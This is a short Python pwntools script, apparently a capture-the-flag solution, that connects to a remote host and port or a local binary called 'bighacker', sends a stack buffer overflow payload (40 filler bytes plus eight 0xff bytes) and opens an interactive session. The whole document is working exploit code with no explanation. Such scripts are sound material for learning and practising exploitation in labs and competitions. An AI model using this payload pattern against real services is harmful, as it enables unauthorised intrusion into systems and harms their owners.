from pwn import *

HOST='35.224.53.124'
PORT = 1338

if args.LOCAL:
  p = process("./bighacker")
else:
  p = remote(HOST, PORT)

p.sendline("A" * (32 + 8) + "\xff" * 8)

p.interactive()
